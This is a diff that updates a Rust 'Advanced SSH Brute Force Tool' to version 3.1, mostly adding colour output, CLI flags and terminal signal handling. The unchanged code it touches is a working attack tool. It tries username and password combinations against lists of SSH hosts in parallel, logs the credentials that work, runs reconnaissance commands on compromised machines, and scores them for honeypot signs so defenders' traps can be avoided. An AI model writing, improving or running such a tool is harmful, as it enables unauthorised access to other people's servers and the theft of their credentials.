@@ -1,3 +1,13 @@
+// ===========================================================================
+// Advanced SSH Brute Force Tool v3.1
+//   - Cross-platform in-place screen update (ANSI + Win32 legacy fallback)
+//   - Windows 2012 / 7 support via SetConsoleCursorPosition
+//   - CLI args: -u -p -i -o -t -w -c -h (--no-color)
+//   - All outputs (combo, goods, detailed, honeypots) go into -o <dir>
+//   - Auto-clear screen every 15 seconds
+//   - Ctrl+C / SIGTERM / panic safe (cursor restored on exit)
+//   - ANSI colors (auto/on/off), minimal icons
+// ===========================================================================
 use chrono::Local;
 use crossbeam_channel::{bounded, Receiver, Sender};
 use regex::Regex;
@@ -12,12 +22,156 @@ use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
-const VERSION: &str = "2.9";
+const VERSION: &str = "3.1";
 const CONCURRENT_PER_WORKER: usize = 1;
+const AUTO_CLEAR_INTERVAL: Duration = Duration::from_secs(15);
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
+// Colors
+// ===========================================================================
+#[derive(Clone, Copy, PartialEq, Eq, Default)]
+enum ColorMode {
+    #[default]
+    Auto,
+    Always,
+    Never,
+}
+
+#[derive(Clone, Copy)]
+struct Palette {
+    enabled: bool,
+}
+
+impl Palette {
+    fn new(mode: ColorMode, vt: bool, tty: bool) -> Self {
+        let enabled = match mode {
+            ColorMode::Never => false,
+            ColorMode::Always => {
+                if tty {
+                    vt // on TTY need VT to work
+                } else {
+                    true // user forced on for redirected output
+                }
+            }
+            ColorMode::Auto => vt && tty,
+        };
+        Self { enabled }
+    }
+
+    fn paint(&self, code: &str, text: &str) -> String {
+        if self.enabled {
+            format!("\x1b[{}m{}\x1b[0m", code, text)
+        } else {
+            text.to_string()
+        }
+    }
+
+    fn cyan(&self, s: &str) -> String { self.paint("36", s) }
+    fn cyan_bold(&self, s: &str) -> String { self.paint("1;36", s) }
+    fn green(&self, s: &str) -> String { self.paint("32", s) }
+    fn red(&self, s: &str) -> String { self.paint("31", s) }
+    fn yellow(&self, s: &str) -> String { self.paint("33", s) }
+    fn dim(&self, s: &str) -> String { self.paint("2", s) }
+    fn bold(&self, s: &str) -> String { self.paint("1", s) }
+}
+
+// ===========================================================================
+// Signal guard — restores cursor on Ctrl+C / SIGINT / SIGTERM / panic
+// ===========================================================================
+mod sigguard {
+    use std::sync::atomic::{AtomicBool, Ordering};
+
+    pub static VT_ENABLED: AtomicBool = AtomicBool::new(false);
+
+    pub fn install(vt: bool) {
+        VT_ENABLED.store(vt, Ordering::Relaxed);
+        #[cfg(unix)]
+        install_unix();
+        #[cfg(target_os = "windows")]
+        install_win();
+    }
+
+    #[cfg(unix)]
+    fn install_unix() {
+        extern "C" {
+            fn signal(sig: i32, handler: usize) -> usize;
+            fn write(fd: i32, buf: *const u8, count: usize) -> isize;
+            fn _exit(code: i32) -> !;
+        }
+
+        extern "C" fn on_signal(_sig: i32) {
+            if VT_ENABLED.load(Ordering::Relaxed) {
+                let seq: &[u8] = b"\x1b[?25h\x1b[0m\r\n";
+                unsafe {
+                    write(1, seq.as_ptr(), seq.len());
+                }
+            }
+            unsafe {
+                _exit(130);
+            }
+        }
+
+        const SIGINT: i32 = 2;
+        const SIGTERM: i32 = 15;
+        unsafe {
+            signal(SIGINT, on_signal as usize);
+            signal(SIGTERM, on_signal as usize);
+        }
+    }
+
+    #[cfg(target_os = "windows")]
+    fn install_win() {
+        use std::ffi::c_void;
+
+        const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5u32;
+        type HandlerRoutine = unsafe extern "system" fn(u32) -> i32;
+
+        #[link(name = "kernel32")]
+        extern "system" {
+            fn SetConsoleCtrlHandler(handler: Option<HandlerRoutine>, add: i32) -> i32;
+            fn GetStdHandle(n: u32) -> *mut c_void;
+            fn WriteFile(
+                h: *mut c_void,
+                buf: *const u8,
+                len: u32,
+                written: *mut u32,
+                ovl: *mut c_void,
+            ) -> i32;
+            fn ExitProcess(code: u32) -> !;
+        }
+
+        unsafe extern "system" fn on_ctrl(_ctrl_type: u32) -> i32 {
+            if VT_ENABLED.load(Ordering::Relaxed) {
+                let seq: &[u8] = b"\x1b[?25h\x1b[0m\r\n";
+                let h = GetStdHandle(STD_OUTPUT_HANDLE);
+                if !h.is_null() {
+                    let mut w = 0u32;
+                    let _ = WriteFile(h, seq.as_ptr(), seq.len() as u32, &mut w, std::ptr::null_mut());
+                }
+            }
+            ExitProcess(130);
+        }
+
+        unsafe {
+            SetConsoleCtrlHandler(Some(on_ctrl), 1);
+        }
+    }
+}
+
+fn install_panic_hook() {
+    let default = std::panic::take_hook();
+    std::panic::set_hook(Box::new(move |info| {
+        if sigguard::VT_ENABLED.load(Ordering::Relaxed) {
+            print!("\x1b[?25h\x1b[0m");
+            let _ = io::stdout().flush();
+        }
+        default(info);
+    }));
+}
+
+// ===========================================================================
 // Win32 FFI (legacy fallback — Windows 2012 / 7)
-// ---------------------------------------------------------------------------
+// ===========================================================================
 #[cfg(target_os = "windows")]
 mod winsys {
     use std::ffi::c_void;
@@ -73,9 +227,9 @@ mod winsys {
     }
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Cross-platform screen renderer
-// ---------------------------------------------------------------------------
+// ===========================================================================
 struct Screen {
     #[cfg(target_os = "windows")]
     handle: usize,
@@ -91,28 +245,49 @@ impl Screen {
         {
             use winsys::*;
             if !console {
-                return Self { handle: 0, vt: false, console: false };
+                return Self {
+                    handle: 0,
+                    vt: false,
+                    console: false,
+                };
             }
             unsafe {
                 let handle = GetStdHandle(STD_OUTPUT_HANDLE);
                 let h = handle as usize;
                 let mut mode = 0u32;
                 if GetConsoleMode(handle, &mut mode) == 0 {
-                    return Self { handle: h, vt: false, console: true };
+                    return Self {
+                        handle: h,
+                        vt: false,
+                        console: true,
+                    };
                 }
                 if SetConsoleMode(handle, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING) == 0 {
-                    return Self { handle: h, vt: false, console: true };
+                    return Self {
+                        handle: h,
+                        vt: false,
+                        console: true,
+                    };
                 }
-                Self { handle: h, vt: true, console: true }
+                Self {
+                    handle: h,
+                    vt: true,
+                    console: true,
+                }
             }
         }
         #[cfg(not(target_os = "windows"))]
         {
-            Self { vt: console, console }
+            Self {
+                vt: console,
+                console,
+            }
         }
     }
 
-    fn is_dumb(&self) -> bool { !self.console }
+    fn is_dumb(&self) -> bool {
+        !self.console
+    }
 
     fn hide_cursor(&self) {
         if self.vt {
@@ -129,7 +304,9 @@ impl Screen {
     }
 
     fn clear(&self) {
-        if !self.console { return; }
+        if !self.console {
+            return;
+        }
         if self.vt {
             print!("\x1b[2J\x1b[H");
             let _ = io::stdout().flush();
@@ -195,9 +372,9 @@ impl Screen {
     }
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Types
-// ---------------------------------------------------------------------------
+// ===========================================================================
 struct Stats {
     goods: AtomicI64,
     errors: AtomicI64,
@@ -248,11 +425,12 @@ struct HoneypotDetector {
     network_analysis: bool,
 }
 
-// ---------------------------------------------------------------------------
-// Output paths — all output files live under one dir
-// ---------------------------------------------------------------------------
+// ===========================================================================
+// Output paths
+// ===========================================================================
 #[derive(Clone)]
 struct OutputPaths {
+    dir: PathBuf,
     combo: PathBuf,
     goods: PathBuf,
     detailed: PathBuf,
@@ -262,6 +440,7 @@ struct OutputPaths {
 impl OutputPaths {
     fn new(dir: &Path) -> Self {
         Self {
+            dir: dir.to_path_buf(),
             combo: dir.join("combo.txt"),
             goods: dir.join("su-goods.txt"),
             detailed: dir.join("detailed-results.txt"),
@@ -270,9 +449,9 @@ impl OutputPaths {
     }
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // CLI args
-// ---------------------------------------------------------------------------
+// ===========================================================================
 #[derive(Default)]
 struct Cli {
     user_file: Option<String>,
@@ -281,6 +460,7 @@ struct Cli {
     output_dir: Option<String>,
     timeout: Option<u64>,
     workers: Option<usize>,
+    color: ColorMode,
 }
 
 fn print_help() {
@@ -294,17 +474,21 @@ fn print_help() {
     println!("  -u, --user   <FILE>   Username list file (one per line)");
     println!("  -p, --pass   <FILE>   Password list file (one per line)");
     println!("  -i, --ip     <FILE>   IP list file (ip:port per line)");
-    println!("  -o, --output <DIR>    Output directory for combo.txt, su-goods.txt,");
-    println!("                        detailed-results.txt, honeypots.txt");
-    println!("                        (default: current directory)");
+    println!("  -o, --output <DIR>    Output directory (auto-created if missing)");
+    println!("                        Files: combo.txt, su-goods.txt,");
+    println!("                               detailed-results.txt, honeypots.txt");
+    println!("                        Default: current directory");
     println!("  -t, --timeout <SECS>  Connection timeout (default: prompt)");
     println!("  -w, --workers <N>     Max concurrent workers (default: prompt)");
+    println!("  -c, --color  <MODE>   auto | on | off (default: auto)");
+    println!("      --no-color        Same as --color off");
     println!("  -h, --help            Show this help");
     println!();
     println!("EXAMPLES:");
     println!("  {} users.txt", prog);
     println!("  {} -u users.txt -p pass.txt -o results/run1", prog);
     println!("  {} -u users.txt -p pass.txt -i ips.txt -o out -t 8 -w 50", prog);
+    println!("  {} -u users.txt --no-color", prog);
     println!();
     println!("Missing options are prompted interactively.");
 }
@@ -322,6 +506,15 @@ fn parse_cli() -> Cli {
             "-o" | "--output" => cli.output_dir = args.next(),
             "-t" | "--timeout" => cli.timeout = args.next().and_then(|s| s.parse().ok()),
             "-w" | "--workers" => cli.workers = args.next().and_then(|s| s.parse().ok()),
+            "-c" | "--color" => {
+                let v = args.next().unwrap_or_else(|| "auto".into());
+                cli.color = match v.to_lowercase().as_str() {
+                    "on" | "always" | "yes" | "true" | "1" => ColorMode::Always,
+                    "off" | "never" | "no" | "false" | "0" => ColorMode::Never,
+                    _ => ColorMode::Auto,
+                };
+            }
+            "--no-color" => cli.color = ColorMode::Never,
             "-h" | "--help" => {
                 print_help();
                 std::process::exit(0);
@@ -331,43 +524,43 @@ fn parse_cli() -> Cli {
                 positional_used = true;
             }
             other => {
-                eprintln!("⚠️  Unknown arg ignored: {}", other);
+                eprintln!("[!] Unknown arg ignored: {}", other);
             }
         }
     }
     cli
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Output dir resolver
-// ---------------------------------------------------------------------------
-fn resolve_output_dir(given: Option<&str>) -> PathBuf {
+// ===========================================================================
+fn resolve_output_dir(given: Option<&str>, pal: &Palette) -> PathBuf {
     let dir = given
         .map(PathBuf::from)
         .unwrap_or_else(|| PathBuf::from("."));
 
     if dir.exists() {
         if dir.is_dir() {
-            println!("✔️  Output dir: {}", dir.display());
+            println!("[+] {}", pal.green(&format!("Output dir: {}", dir.display())));
             return dir;
         }
-        eprintln!("❌ Not a directory: {}", dir.display());
-        eprintln!("   Falling back to current directory.");
+        eprintln!("[!] {}", pal.yellow(&format!("Not a directory: {}", dir.display())));
+        eprintln!("    Falling back to current directory.");
         return PathBuf::from(".");
     }
 
     if let Err(e) = std::fs::create_dir_all(&dir) {
-        eprintln!("❌ Cannot create output dir {}: {}", dir.display(), e);
-        eprintln!("   Falling back to current directory.");
+        eprintln!("[!] {}", pal.red(&format!("Cannot create output dir {}: {}", dir.display(), e)));
+        eprintln!("    Falling back to current directory.");
         return PathBuf::from(".");
     }
-    println!("✔️  Created output dir: {}", dir.display());
+    println!("[+] {}", pal.green(&format!("Created output dir: {}", dir.display())));
     dir
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Input helpers
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn prompt<R: BufRead>(reader: &mut R, msg: &str) -> String {
     print!("{}", msg);
     let _ = io::stdout().flush();
@@ -380,30 +573,40 @@ fn file_exists<P: AsRef<Path>>(path: P) -> bool {
     path.as_ref().exists()
 }
 
-fn resolve_file<R: BufRead>(reader: &mut R, given: Option<String>, label: &str) -> String {
+fn resolve_file<R: BufRead>(
+    reader: &mut R,
+    given: Option<String>,
+    label: &str,
+    pal: &Palette,
+) -> String {
     if let Some(f) = given {
         if file_exists(&f) {
-            println!("✔️  {} file: {}", label, f);
+            println!("[+] {}", pal.green(&format!("{} file: {}", label, f)));
             return f;
         }
-        eprintln!("❌ {} file not found: {}", label, f);
+        eprintln!("[!] {}", pal.yellow(&format!("{} file not found: {}", label, f)));
     }
     loop {
         let p = prompt(reader, &format!("Enter the {} list file path: ", label));
         if file_exists(&p) {
             return p;
         }
-        eprintln!("❌ File not found: {}, try again.", p);
+        eprintln!("[!] {}", pal.red(&format!("File not found: {}, try again.", p)));
     }
 }
 
-fn resolve_num<R: BufRead, T>(reader: &mut R, given: Option<T>, label: &str) -> T
+fn resolve_num<R: BufRead, T>(
+    reader: &mut R,
+    given: Option<T>,
+    label: &str,
+    pal: &Palette,
+) -> T
 where
     T: std::str::FromStr + PartialOrd + Default + Copy + std::fmt::Display,
 {
     if let Some(v) = given {
         if v > T::default() {
-            println!("✔️  {}: {}", label, v);
+            println!("[+] {}", pal.green(&format!("{}: {}", label, v)));
             return v;
         }
     }
@@ -411,7 +614,7 @@ where
         let s = prompt(reader, &format!("Enter the {}: ", label));
         match s.parse::<T>() {
             Ok(v) if v > T::default() => return v,
-            _ => eprintln!("❌ Invalid number, try again."),
+            _ => eprintln!("[!] {}", pal.red("Invalid number, try again.")),
         }
     }
 }
@@ -447,10 +650,15 @@ fn append_to_file<P: AsRef<Path>>(data: &str, path: P) {
     }
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Combo builder
-// ---------------------------------------------------------------------------
-fn build_combo<R: BufRead>(reader: &mut R, cli: &Cli, outputs: &OutputPaths) {
+// ===========================================================================
+fn build_combo<R: BufRead>(
+    reader: &mut R,
+    cli: &Cli,
+    outputs: &OutputPaths,
+    pal: &Palette,
+) {
     let from_cli = cli.user_file.is_some() || cli.pass_file.is_some();
 
     if !from_cli && outputs.combo.exists() {
@@ -459,13 +667,13 @@ fn build_combo<R: BufRead>(reader: &mut R, cli: &Cli, outputs: &OutputPaths) {
             &format!("{} exists. Reuse it? (y/n): ", outputs.combo.display()),
         );
         if ans.eq_ignore_ascii_case("y") || ans.eq_ignore_ascii_case("yes") {
-            println!("✔️  Using existing {}", outputs.combo.display());
+            println!("[+] {}", pal.green(&format!("Using existing {}", outputs.combo.display())));
             return;
         }
     }
 
-    let ufile = resolve_file(reader, cli.user_file.clone(), "username");
-    let pfile = resolve_file(reader, cli.pass_file.clone(), "password");
+    let ufile = resolve_file(reader, cli.user_file.clone(), "username", pal);
+    let pfile = resolve_file(reader, cli.pass_file.clone(), "password", pal);
 
     let usernames = get_items(&ufile);
     let passwords = get_items(&pfile);
@@ -473,7 +681,10 @@ fn build_combo<R: BufRead>(reader: &mut R, cli: &Cli, outputs: &OutputPaths) {
     let mut file = match File::create(&outputs.combo) {
         Ok(f) => f,
         Err(e) => {
-            eprintln!("Failed to create {}: {}", outputs.combo.display(), e);
+            eprintln!(
+                "[!] {}",
+                pal.red(&format!("Failed to create {}: {}", outputs.combo.display(), e))
+            );
             std::process::exit(1);
         }
     };
@@ -489,29 +700,43 @@ fn build_combo<R: BufRead>(reader: &mut R, cli: &Cli, outputs: &OutputPaths) {
         }
     }
     println!(
-        "✔️  {} created with {} entries",
-        outputs.combo.display(),
-        count
+        "[+] {}",
+        pal.green(&format!(
+            "{} created with {} entries",
+            outputs.combo.display(),
+            count
+        ))
     );
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Entry point
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn main() {
     let cli = parse_cli();
     let screen = Screen::new();
+    let pal = Palette::new(cli.color, screen.vt, screen.console);
+
+    sigguard::install(screen.vt);
+    install_panic_hook();
+
+    if cli.color == ColorMode::Always && screen.console && !screen.vt {
+        eprintln!(
+            "[!] {}",
+            pal.yellow("This console does not support ANSI colors (legacy Windows).")
+        );
+    }
+
     let mut reader = io::stdin().lock();
 
-    let output_dir = resolve_output_dir(cli.output_dir.as_deref());
+    let output_dir = resolve_output_dir(cli.output_dir.as_deref(), &pal);
     let outputs = Arc::new(OutputPaths::new(&output_dir));
 
-    build_combo(&mut reader, &cli, &outputs);
+    build_combo(&mut reader, &cli, &outputs, &pal);
 
-    let ip_file = resolve_file(&mut reader, cli.ip_file.clone(), "IP");
-    let timeout: u64 = resolve_num(&mut reader, cli.timeout, "timeout value (seconds)");
-    let max_workers: usize =
-        resolve_num(&mut reader, cli.workers, "maximum number of workers");
+    let ip_file = resolve_file(&mut reader, cli.ip_file.clone(), "IP", &pal);
+    let timeout: u64 = resolve_num(&mut reader, cli.timeout, "timeout (seconds)", &pal);
+    let max_workers: usize = resolve_num(&mut reader, cli.workers, "workers", &pal);
 
     let start_time = Instant::now();
 
@@ -524,6 +749,7 @@ fn main() {
 
     setup_enhanced_worker_pool(
         screen,
+        pal,
         combos,
         ips,
         max_workers,
@@ -536,12 +762,12 @@ fn main() {
         start_time,
     );
 
-    println!("Operation completed successfully!");
+    println!("{}", pal.green("Operation completed successfully!"));
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // SSH plumbing
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn ssh_connect(
     ip: &str,
     port: &str,
@@ -562,7 +788,11 @@ fn ssh_connect(
     sess.handshake().ok()?;
     sess.userauth_password(username, password).ok()?;
 
-    if sess.authenticated() { Some(sess) } else { None }
+    if sess.authenticated() {
+        Some(sess)
+    } else {
+        None
+    }
 }
 
 fn execute_command(sess: &Session, command: &str) -> String {
@@ -583,12 +813,16 @@ fn execute_command(sess: &Session, command: &str) -> String {
         let _ = stderr_stream.read_to_string(&mut stderr);
     }
 
-    if stderr.is_empty() { stdout } else { format!("{}{}", stdout, stderr) }
+    if stderr.is_empty() {
+        stdout
+    } else {
+        format!("{}{}", stdout, stderr)
+    }
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // System info gathering
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn gather_system_info(sess: &Session, server_info: &mut ServerInfo) {
     let commands: [(&str, &str); 12] = [
         ("hostname", "hostname"),
@@ -638,9 +872,9 @@ fn scan_local_ports(sess: &Session) -> Vec<String> {
     ports
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Honeypot detection
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn detect_honeypot(
     sess: &Session,
     server_info: &mut ServerInfo,
@@ -676,7 +910,9 @@ fn analyze_command_output(server_info: &ServerInfo) -> i32 {
     for output in server_info.commands.values() {
         let lower = output.to_lowercase();
         for ind in indicators.iter() {
-            if lower.contains(ind) { score += 3; }
+            if lower.contains(ind) {
+                score += 3;
+            }
         }
     }
     score
@@ -695,9 +931,13 @@ fn analyze_file_system(server_info: &ServerInfo) -> i32 {
     let suspicious = ["total 0", "total 4", "honeypot", "fake", "simulation"];
     let lower = ls_output.to_lowercase();
     for p in suspicious.iter() {
-        if lower.contains(p) { score += 1; }
+        if lower.contains(p) {
+            score += 1;
+        }
     }
-    if ls_output.trim().lines().count() < 5 { score += 1; }
+    if ls_output.trim().lines().count() < 5 {
+        score += 1;
+    }
     score
 }
 
@@ -714,9 +954,13 @@ fn analyze_processes(server_info: &ServerInfo) -> i32 {
     ];
     let lower = ps_output.to_lowercase();
     for p in suspicious.iter() {
-        if lower.contains(p) { score += 2; }
+        if lower.contains(p) {
+            score += 2;
+        }
     }
-    if ps_output.trim().lines().count() < 5 { score += 1; }
+    if ps_output.trim().lines().count() < 5 {
+        score += 1;
+    }
     score
 }
 
@@ -734,12 +978,18 @@ fn analyze_network(sess: &Session) -> i32 {
 
     let iface = execute_command(sess, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5");
     let il = iface.to_lowercase();
-    if il.contains("fake") || il.contains("honeypot") || il.contains("trap") || iface.trim().len() < 10 {
+    if il.contains("fake")
+        || il.contains("honeypot")
+        || il.contains("trap")
+        || iface.trim().len() < 10
+    {
         score += 1;
     }
 
     let route = execute_command(sess, "ip route show 2>/dev/null | head -3");
-    if route.trim().len() < 20 { score += 1; }
+    if route.trim().len() < 20 {
+        score += 1;
+    }
     score
 }
 
@@ -767,7 +1017,9 @@ fn behavioral_tests(sess: &Session, _server_info: &mut ServerInfo) -> i32 {
             accessible += 1;
         }
     }
-    if accessible == sensitive.len() { score += 1; }
+    if accessible == sensitive.len() {
+        score += 1;
+    }
 
     let cmds = ["id", "whoami", "pwd"];
     let mut working = 0;
@@ -777,7 +1029,9 @@ fn behavioral_tests(sess: &Session, _server_info: &mut ServerInfo) -> i32 {
             working += 1;
         }
     }
-    if working == 0 { score += 2; }
+    if working == 0 {
+        score += 2;
+    }
     score
 }
 
@@ -786,10 +1040,14 @@ fn advanced_honeypot_tests(sess: &Session) -> i32 {
 
     let cpu = execute_command(sess, "cat /proc/cpuinfo | grep 'model name' | head -1");
     let cl = cpu.to_lowercase();
-    if cl.contains("qemu") || cl.contains("virtual") { score += 1; }
+    if cl.contains("qemu") || cl.contains("virtual") {
+        score += 1;
+    }
 
     let kernel = execute_command(sess, "uname -r");
-    if kernel.contains("generic") && kernel.trim().len() < 20 { score += 1; }
+    if kernel.contains("generic") && kernel.trim().len() < 20 {
+        score += 1;
+    }
 
     let pms = ["which apt", "which yum", "which pacman", "which zypper"];
     let mut working_pms = 0;
@@ -799,16 +1057,22 @@ fn advanced_honeypot_tests(sess: &Session) -> i32 {
             working_pms += 1;
         }
     }
-    if working_pms == 0 { score += 1; }
+    if working_pms == 0 {
+        score += 1;
+    }
 
     let services = execute_command(
         sess,
         "systemctl list-units --type=service --state=running 2>/dev/null | head -10",
     );
-    if services.contains("0 loaded units") || services.trim().len() < 50 { score += 1; }
+    if services.contains("0 loaded units") || services.trim().len() < 50 {
+        score += 1;
+    }
 
     let net = execute_command(sess, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'");
-    if net.trim().is_empty() { score += 1; }
+    if net.trim().is_empty() {
+        score += 1;
+    }
 
     score
 }
@@ -816,13 +1080,17 @@ fn advanced_honeypot_tests(sess: &Session) -> i32 {
 fn performance_tests(sess: &Session) -> i32 {
     let mut score = 0;
     let io = execute_command(sess, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1");
-    if io.contains("command not found") { score += 1; }
+    if io.contains("command not found") {
+        score += 1;
+    }
     execute_command(sess, "rm -f /tmp/test");
 
     let net = execute_command(sess, "ss -tuln 2>/dev/null | wc -l");
     if !net.is_empty() {
         if let Ok(count) = net.trim().parse::<i32>() {
-            if count < 5 { score += 1; }
+            if count < 5 {
+                score += 1;
+            }
         }
     }
     score
@@ -838,7 +1106,9 @@ fn detect_anomalies(server_info: &ServerInfo) -> i32 {
         ];
         let h = server_info.hostname.to_lowercase();
         for s in suspicious.iter() {
-            if h.contains(s) { score += 1; }
+            if h.contains(s) {
+                score += 1;
+            }
         }
     }
 
@@ -849,20 +1119,22 @@ fn detect_anomalies(server_info: &ServerInfo) -> i32 {
     }
 
     if let Some(h) = server_info.commands.get("history") {
-        if h.trim().lines().count() < 3 { score += 1; }
+        if h.trim().lines().count() < 3 {
+            score += 1;
+        }
     }
     score
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Logging
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn log_successful_connection(info: &ServerInfo, outputs: &OutputPaths) {
     let msg = format!("{}:{}@{}:{}", info.ip, info.port, info.username, info.password);
     append_to_file(&format!("{}\n", msg), &outputs.goods);
 
     let detailed = format!(
-        "\n=== SSH Success ===\n🌐 Target: {}:{}\n🔑 Credentials: {}:{}\n🖥️ Hostname: {}\n🐧 OS: {}\n📡 SSH Version: {}\n⚡ Response Time: {:?}\n🍯 Honeypot Score: {}\n🕒 Timestamp: {}\n========================\n",
+        "\n=== SSH Success ===\nTarget: {}:{}\nCredentials: {}:{}\nHostname: {}\nOS: {}\nSSH Version: {}\nResponse Time: {:?}\nHoneypot Score: {}\nTimestamp: {}\n========================\n",
         info.ip, info.port,
         info.username, info.password,
         info.hostname,
@@ -875,9 +1147,9 @@ fn log_successful_connection(info: &ServerInfo, outputs: &OutputPaths) {
     append_to_file(&detailed, &outputs.detailed);
 }
 
-// ---------------------------------------------------------------------------
+// ===========================================================================
 // Banner
-// ---------------------------------------------------------------------------
+// ===========================================================================
 fn format_time(seconds: f64) -> String {
     let t = seconds as u64;
     let days = t / 86400;
@@ -887,8 +1159,10 @@ fn format_time(seconds: f64) -> String {
     format!("{:02}:{:02}:{:02}:{:02}", days, hours, minutes, secs)
 }
 
+#[allow(clippy::too_many_arguments)]
 fn banner(
     screen: Screen,
+    pal: Palette,
     stats: Arc<Stats>,
     ip_file: String,
     output_dir: PathBuf,
@@ -903,10 +1177,19 @@ fn banner(
 
     let dumb = screen.is_dumb();
     let mut tick: u64 = 0;
+    let mut last_clear = Instant::now();
+
+    let bar = "==========================================";
+    let thin = "------------------------------------------";
 
     loop {
         thread::sleep(Duration::from_millis(500));
         tick += 1;
+
+        if !dumb && last_clear.elapsed() >= AUTO_CLEAR_INTERVAL {
+            screen.clear();
+            last_clear = Instant::now();
+        }
 
         let goods = stats.goods.load(Ordering::Relaxed);
         let errors = stats.errors.load(Ordering::Relaxed);
@@ -914,21 +1197,36 @@ fn banner(
 
         let total_connections = (goods + errors + honeypots) as usize;
         let elapsed = start_time.elapsed().as_secs_f64();
-        let cps = if elapsed > 0.0 { total_connections as f64 / elapsed } else { 0.0 };
+        let cps = if elapsed > 0.0 {
+            total_connections as f64 / elapsed
+        } else {
+            0.0
+        };
         let remaining = if cps > 0.0 {
             (total_ip_count as f64 - total_connections as f64) / cps
-        } else { 0.0 };
+        } else {
+            0.0
+        };
 
-        let last_success = stats.last_success.lock().map(|s| s.clone()).unwrap_or_default();
-        let last_honeypot = stats.last_honeypot.lock().map(|s| s.clone()).unwrap_or_default();
+        let last_success = stats
+            .last_success
+            .lock()
+            .map(|s| s.clone())
+            .unwrap_or_default();
+        let last_honeypot = stats
+            .last_honeypot
+            .lock()
+            .map(|s| s.clone())
+            .unwrap_or_default();
 
-        let finished = stop_flag.load(Ordering::Relaxed) || total_connections >= total_ip_count;
+        let finished =
+            stop_flag.load(Ordering::Relaxed) || total_connections >= total_ip_count;
 
         if dumb && tick % 10 != 0 && !finished {
             continue;
         }
 
-        let mut frame = String::with_capacity(1700);
+        let mut frame = String::with_capacity(2000);
         macro_rules! ln {
             ($($arg:tt)*) => {{
                 frame.push_str(&format!($($arg)*));
@@ -936,54 +1234,74 @@ fn banner(
             }};
         }
 
-        ln!("==========================================");
-        ln!("🚀 Advanced SSH Brute Force Tool v{} 🚀", VERSION);
-        ln!("==========================================");
-        ln!("📁 IP File: {} | ⏱️  Timeout: {}s", ip_file, timeout);
-        ln!("📂 Output:  {}", output_dir.display());
-        ln!("🔗 Max Workers: {} | Per Worker: {}", max_workers, CONCURRENT_PER_WORKER);
-        ln!("==========================================");
-        ln!("🔍 Checked SSH: {}/{}", total_connections, total_ip_count);
-        ln!("⚡ Speed: {:.2} checks/sec", cps);
+        ln!("{}", pal.cyan(bar));
+        ln!(" {}", pal.cyan_bold(&format!("Advanced SSH Brute Force Tool v{}", VERSION)));
+        ln!("{}", pal.cyan(bar));
+        ln!(" {} {}", pal.dim("IP File :"), ip_file);
+        ln!(" {} {}", pal.dim("Output  :"), output_dir.display());
+        ln!(" {} {}s", pal.dim("Timeout :"), timeout);
+        ln!(" {} {} (x{} per worker)", pal.dim("Workers :"), max_workers, CONCURRENT_PER_WORKER);
+        ln!("{}", pal.cyan(bar));
+        ln!(
+            " {} {}/{}",
+            pal.dim("Checked :"),
+            pal.bold(&total_connections.to_string()),
+            total_ip_count
+        );
+        ln!(" {} {:.2} checks/sec", pal.dim("Speed   :"), cps);
 
         if total_connections < total_ip_count {
-            ln!("⏳ Elapsed: {}", format_time(elapsed));
-            ln!("⏰ Remaining: {}", format_time(remaining));
-            ln!("==========================================");
+            ln!(" {} {}", pal.dim("Elapsed :"), format_time(elapsed));
+            ln!(" {} {}", pal.dim("Remain  :"), format_time(remaining));
         } else {
-            ln!("⏳ Total Time: {}", format_time(elapsed));
-            ln!("✅ Scan Completed Successfully!");
-            ln!("==========================================");
+            ln!(" {} {}", pal.dim("Elapsed :"), format_time(elapsed));
+            ln!(" {}", pal.green("Scan Completed Successfully"));
         }
+        ln!("{}", pal.cyan(bar));
 
-        ln!("✅ Successful: {}", goods);
-        ln!("❌ Failed: {}", errors);
-        ln!("🍯 Honeypots: {}", honeypots);
-        ln!("==========================================");
+        ln!(" {} {}", pal.dim("Success :"), pal.green(&goods.to_string()));
+        ln!(" {} {}", pal.dim("Failed  :"), pal.red(&errors.to_string()));
+        ln!(" {} {}", pal.dim("Honeypot:"), pal.yellow(&honeypots.to_string()));
+        ln!("{}", pal.cyan(bar));
 
         if total_connections > 0 {
             let succ = goods + honeypots;
             if succ > 0 {
-                ln!("📊 Success Rate: {:.2}%", goods as f64 / succ as f64 * 100.0);
-                ln!("🍯 Honeypot Rate: {:.2}%", honeypots as f64 / succ as f64 * 100.0);
+                ln!(
+                    " {} {:.2}%",
+                    pal.dim("Succ Rate:"),
+                    goods as f64 / succ as f64 * 100.0
+                );
+                ln!(
+                    " {} {:.2}%",
+                    pal.dim("HP Rate  :"),
+                    honeypots as f64 / succ as f64 * 100.0
+                );
+                ln!("{}", pal.cyan(thin));
             }
         }
 
-        if !last_success.is_empty() { ln!("🌟 Last: {}", last_success); }
-        if !last_honeypot.is_empty() { ln!("🎯 Last HP: {}", last_honeypot); }
+        if !last_success.is_empty() {
+            ln!(" {} {}", pal.dim("Last OK  :"), pal.green(&last_success));
+        }
+        if !last_honeypot.is_empty() {
+            ln!(" {} {}", pal.dim("Last HP  :"), pal.yellow(&last_honeypot));
+        }
 
         screen.render(&frame);
 
-        if finished { break; }
+        if finished {
+            break;
+        }
     }
 
